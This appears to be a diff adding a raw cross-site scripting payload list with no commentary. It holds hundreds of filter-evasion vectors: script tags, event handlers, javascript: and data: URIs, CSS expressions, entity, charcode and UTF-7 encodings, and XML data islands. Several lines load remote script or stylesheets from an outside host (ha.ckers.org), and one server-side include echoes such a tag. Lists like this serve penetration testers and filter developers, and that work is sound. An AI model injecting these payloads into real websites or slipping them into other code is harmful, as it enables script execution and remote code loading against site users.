@@ -1,0 +1,478 @@
+                                                                     
+                                             
+<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
+
+
+
+><img id=XSS SRC=x onerror=alert(XSS);>
+
+
+;!--"<XSS>=&{()}"
+
+
+
+<IMG id=XSS SRC="javascript:alert('XSS');">
+
+
+
+<IMG id=XSS SRC=javascript:alert('XSS')>
+
+
+       
+<IMG id=XSS SRC=JaVaScRiPt:alert('XSS')>
+
+
+
+<IMG id=XSS SRC=javascript:alert(&quot;XSS&quot;)>
+
+
+
+<IMG id=XSS SRC=`javascript:alert("'XSS'")`>
+
+
+       
+<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
+
+
+
+<IMG id=XSS SRC="jav   ascript:alert('XSS');">
+
+
+
+<IMG id=XSS SRC="jav&#x09;ascript:alert('XSS');">
+
+       
+
+<IMG id=XSS SRC="jav&#x0A;ascript:alert('XSS');">
+
+
+
+<IMG id=XSS SRC="jav&#x0D;ascript:alert('XSS');">
+
+
+
+perl -e 'print "<IMG id=XSS SRC=java\0script:alert(\"XSS\")>";' > out
+
+       
+
+<IMG id=XSS SRC=" &#14;  javascript:alert('XSS');">
+
+       
+
+<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
+
+       
+
+<<SCRIPT>alert("XSS");//<</SCRIPT>
+
+
+
+\";alert('XSS');//
+
+
+
+<IMG id=XSS SRC='javascript:alert('XSS')
+
+
+
+ <SCRIPT>alert(/XSS/.source)</SCRIPT>
+
+
+
+<BODY BACKGROUND="javascript:alert('XSS')">
+
+
+
+</TITLE><SCRIPT>alert("XSS");</SCRIPT>
+
+
+
+<INPUT TYPE="IMAGE" id=XSS SRC="javascript:alert('XSS');">
+
+
+
+<BODY ONLOAD=alert('XSS')>
+
+
+
+<IMG DYN id=XSS SRC="javascript:alert('XSS')">
+
+
+
+<IMG LOW id=XSS SRC="javascript:alert('XSS')">
+
+
+
+<BGSOUND id=XSS SRC="javascript:alert('XSS');">
+
+
+
+
+<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
+
+
+
+<IMG id=XSS SRC='vbscript:msgbox("XSS")'>
+
+
+
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
+
+
+
+<TABLE id=XSS BACKGROUND="javascript:alert('XSS')">
+
+
+
+<TABLE id=XSS><TD BACKGROUND="javascript:alert('XSS')">
+
+
+
+<DIV id=XSS STYLE="background-image: url(javascript:alert('XSS'))">
+
+
+       
+<DIV id=XSS STYLE="width: expression(alert('XSS'));">
+
+
+
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
+
+  
+
+<IFRAME id=XSS SRC="javascript:alert('XSS');"></IFRAME>
+
+
+
+<FRAMESET><FRAME id=XSS SRC="javascript:alert('XSS');"></FRAMESET>
+
+
+
+<TABLE BACKGROUND="javascript:alert('XSS')">
+
+
+   
+<TABLE><TD BACKGROUND="javascript:alert('XSS')">"
+
+       
+<DIV id=XSS STYLE="background-image: url(&#1;javascript:alert('XSS'))">
+
+
+
+<DIV id=XSS STYLE="width: expression(alert('XSS'));">
+
+       
+
+<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
+
+
+
+<IMG id=XSS STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
+
+
+      
+
+
+ 
+<STYLE TYPE="text/javascript">alert('XSS');</STYLE>
+
+
+
+<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
+
+
+   
+<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
+
+
+
+
+<BASE HREF="javascript:alert('XSS');//">
+
+
+
+<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>
+
+
+   
+a="get";b="URL(\"";c="javascript:";d="alert('XSS');\")";eval(a+b+c+d);
+
+
+       
+<XML id=XSS><X><C><![CDATA[<IMG id=XSS SRC="javas]]><![CDATA[cript:alert('XSS');">]]></C></X><xml><SPAN DATAid=XSS SRC=#I DATAFLD=CDATAFORMATAS=HTML></SPAN>
+
+
+       
+<XML ID="XSS"><I><B>&lt;IMG id=XSS SRC="javas<!-- -->cript:alert('XSS')"&gt;</B></I></XML><SPAN DATAid=XSS SRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
+
+
+
+<XML id=XSS SRC="xsstest.xml" ID=I></XML><SPAN DATAid=XSS SRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
+
+
+
+<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;"></BODY></HTML>
+
+
+   
+<? echo('<SCR)';echo('IPT>alert("XSS")</SCRIPT>'); ?>
+
+
+       
+<META HTTP-EQUIV="Set-Cookie" Content="USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;">
+
+
+
+
+<SCRIPT id=XSS SRC=http://127.0.0.1></SCRIPT>
+
+
+//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+
+
+<IMG id=XSS SRC=javascript:alert(String.fromCharCode(88,83,83))>
+
+<IMG id=XSS SRC="&14;javascript:alert('XSS');">
+
+   
+<SCRIPT <B>=alert('XSS');"></SCRIPT>
+
+
+<IFRAME id=XSS SRC="javascript:alert('XSS'); <
+
+
+<SCRIPT>a=/XSS/nalert('XSS');</SCRIPT>
+
+
+
+   
+<STYLE>li {list-style-image: url("javascript:alert('XSS');</STYLE><UL><LI>XSS
+
+
+<DIV STYLE="background-image: url(&#1;javascript:alert('XSS'));">
+
+       
+<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"></HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
+
+
+<a href="javascript#alert('XSS');">
+
+
+<div onmouseover="alert('XSS');">,
+
+
+<input type="image" dynid=XSS SRC="javascript:alert('XSS');">
+
+
+&<script>alert('XSS');</script>">
+
+
+
+
+<IMG id=XSS SRC=&{alert('XSS');};>
+
+
+<a id=XSS href="about:<script>alert('XSS');</script>">
+
+
+<DIV id=XSS STYLE="binding: url(javascript:alert('XSS'));">
+
+
+<OBJECT classid=clsid:..." codebase="javascript:alert('XSS');">
+\
+
+<style><!--</style><script>alert('XSS');//--></script>
+
+
+![CDATA[<!--]]<script>alert('XSS');//--></script>
+
+
+<!-- -- --><script>alert('XSS');</script><!-- -- -->
+
+
+<img id=XSS SRC="blah"onmouseover="alert('XSS');">
+
+
+<img id=XSS SRC="blah>"onmouseover="alert('XSS');">
+
+       
+<xml id="X"><a><b><script>alert('XSS');</script>;<b></a></xml>
+
+
+<div datafld="b" dataformatas="html" dataid=XSS SRC="#XSS"></div>
+
+
+[\xC0][\xBC]script>alert('XSS');[\xC0][\xBC]/script>
+
+
+<XML ID=I><X><C><![CDATA[<IMG id=XSS SRC="javas]]<![CDATA[cript:alert('XSS');">]]</C><X></xml>
+
+
+<form id="test" /><button form="test" formaction="javascript:eval(String['fromCharCode'](97,108,101,114,116,40,39,120,115,115,39,41,32))">X
+
+
+
+<input id=XSS onfocus=javascript:eval(String['fromCharCode'](97,108,101,114,116,40,39,120,115,115,39,41,32)) autofocus>
+
+<select id=XSS onfocus=javascript:eval(String['fromCharCode'](97,108,101,114,116,40,39,120,115,115,39,41,32)) autofocus>
+
+<textarea id=XSS onfocus=javascript:eval(String['fromCharCode'](97,108,101,114,116,40,39,120,115,115,39,41,32)) autofocus>
+
+<keygen id=XSS onfocus=javascript:eval(String['fromCharCode'](97,108,101,114,116,40,39,120,115,115,39,41,32)) autofocus>
+
+
+
+<input id=XSS onblur=javascript:eval(String['fromCharCode'](97,108,101,114,116,40,39,120,115,115,39,41,32)) autofocus><input autofocus>
+
+
+
+<video id=XSS poster=javascript:eval(String['fromCharCode'](97,108,101,114,116,40,39,120,115,115,39,41,32))//
+
+
+
+<body id=XSS onscroll=eval(String['fromCharCode'](97,108,101,114,116,40,39,120,115,115,39,41,32))><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>
+
+
+
+<video><source onerror="javascript:eval(String['fromCharCode'](97,108,101,114,116,40,39,120,115,115,39,41,32))">
+
+
+
+<video onerror="javascript:eval(String['fromCharCode'](97,108,101,114,116,40,39,120,115,115,39,41,32))"><source>
+
+
+<iframe id=XSS / /onload=alert(/XSS/)></iframe>
+<iframe id=XSS / "onload=alert(/XSS/)></iframe>
+<iframe id=XSS///////onload=alert(/XSS/)></iframe>
+<iframe id=XSS "onload=alert(/XSS/)></iframe>
+<iframe id=XSS <?php echo chr(11)?> onload=alert(/XSS/)></iframe>
+<iframe id=XSS <?php echo chr(12)?> onload=alert(/XSS/)></iframe>
+
+" onfocus=alert(XSS) "> <"
+" onblur=alert(XSS) "> <"
+" onmouseover=alert(XSS) ">
+" onclick=alert(XSS) ">
+
+	
+<FRAMESET><FRAME id=XSS SRC=\"javascript:alert('XSS');\"></FRAMESET>
+
+	
+<STYLE>li {list-style-image: url(\"javascript:alert('XSS')\");}</STYLE><UL><LI>XSS
+</textarea>'"><script>alert(XSS)</script>
+
+	
+'""><script language="JavaScript"> alert('X \nS \nS');</script>
+
+	
+</script></script><<<<script><>>>><<<script>alert(XSS)</script>
+
+	
+<html><noalert><noscript>(XSS)</noscript><script>(XSS)</script>
+
+	
+<INPUT TYPE="IMAGE" id=XSS SRC="javascript:alert('XSS');">
+
+	
+'></select><script>alert(XSS)</script>
+
+	
+
+
+	
+}</style><script>a=eval;b=alert;a(b(/XSS/.source));</script>
+
+	
+<SCRIPT>document.write("XSS");</SCRIPT>
+
+	
+a="get";b="URL";c="javascript:";d="alert('xss');";eval(a+b+c+d);
+
+	
+='><script>alert("xss")</script>
+
+	
+
+
+	
+<body background=javascript:'"><script>alert(XSS)</script>></body>
+
+
+
+	
+data:text/html;charset=utf-7;base64,Ij48L3RpdGxlPjxzY3JpcHQ+YWxlcnQoMTMzNyk8L3NjcmlwdD4=
+
+
+
+<SCRIPT>alert('XSS');</SCRIPT>
+'';!--"<XSS>=&{()}
+<SCRIPT id=XSS SRC=http://ha.ckers.org/xss.js></SCRIPT>
+<IMG id=XSS SRC="javascript:alert('XSS');">
+<IMG id=XSS SRC=javascript:alert('XSS')>
+<IMG id=XSS SRC=JaVaScRiPt:alert('XSS')>
+<IMG id=XSS SRC=javascript:alert(&quot;XSS&quot;)>
+<IMG id=XSS SRC=`javascript:alert("RSnake says, 'XSS'")`>
+<IMG id=XSS SRC=javascript:alert(String.fromCharCode(88,83,83))>
+id=XSS SRC=&#10<IMG 6;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
+<IMG id=XSS SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
+<IMG id=XSS SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+<IMG id=XSS SRC="jav	ascript:alert('XSS');">
+<IMG id=XSS SRC="jav&#x09;ascript:alert('XSS');">
+<IMG id=XSS SRC="jav&#x0A;ascript:alert('XSS');">
+<IMG id=XSS SRC="jav&#x0D;ascript:alert('XSS');">
+<IMG id=XSS SRC=" &#14;  javascript:alert('XSS');">
+<SCRIPT/XSS id=XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT id=XSS SRC=http://ha.ckers.org/xss.js?<B>
+<IMG id=XSS SRC="javascript:alert('XSS')"
+<SCRIPT>a=/XSS/
+\";alert('XSS');//
+<INPUT TYPE="IMAGE" id=XSS SRC="javascript:alert('XSS');">
+<BODY BACKGROUND="javascript:alert('XSS')">
+<BODY ONLOAD=alert('XSS')>
+<IMG DYNid=XSS SRC="javascript:alert('XSS')">
+<IMG LOWid=XSS SRC="javascript:alert('XSS')">
+<BGSOUND id=XSS SRC="javascript:alert('XSS');">
+<BR SIZE="&{alert('XSS')}">
+<LAYER id=XSS SRC="http://ha.ckers.org/scriptlet.html"></LAYER>
+<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
+<LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css">
+<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>
+<META HTTP-EQUIV="Link" Content="<http://ha.ckers.org/xss.css>; REL=stylesheet">
+<STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE>
+<IMG id=XSS SRC='vbscript:msgbox("XSS")'>
+<IMG id=XSS SRC="mocha:[code]">
+<IMG id=XSS SRC="livescript:[code]">
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
+<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
+<META HTTP-EQUIV="Link" Content="<javascript:alert('XSS')>; REL=stylesheet">
+<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">
+<IFRAME id=XSS SRC="javascript:alert('XSS');"></IFRAME>
+<FRAMESET><FRAME id=XSS SRC="javascript:alert('XSS');"></FRAMESET>
+<TABLE BACKGROUND="javascript:alert('XSS')">
+<DIV STYLE="background-image: url(javascript:alert('XSS'))">
+<DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">
+<DIV STYLE="width: expression(alert('XSS'));">
+<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
+<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
+<XSS STYLE="xss:expression(alert('XSS'))">
+exp/*<XSS STYLE='no\xss:noxss("*//*");
+<STYLE TYPE="text/javascript">alert('XSS');</STYLE>
+<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
+<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
+<BASE HREF="javascript:alert('XSS');//">
+<OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"></OBJECT>
+<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>
+getURL("javascript:alert('XSS')")
+a="get";
+<!--<value><![CDATA[<XML ID=I><X><C><![CDATA[<IMG id=XSS SRC="javas<![CDATA[cript:alert('XSS');">
+<XML id=XSS SRC="http://ha.ckers.org/xsstest.xml" ID=I></XML>
+<HTML><BODY>
+<SCRIPT id=XSS SRC="http://ha.ckers.org/xss.jpg"></SCRIPT>
+<!--#exec cmd="/bin/echo '<SCRIPT SRC'"--><!--#exec cmd="/bin/echo '=http://ha.ckers.org/xss.js></SCRIPT>'"-->
+<? echo('<SCR)';
+<META HTTP-EQUIV="Set-Cookie" Content="USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;">
+<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
+<SCRIPT a=">" id=XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT a=">" '' id=XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT "a='>'" id=XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT a=`>` id=XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT>document.write("<SCRI");</SCRIPT>PT id=XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
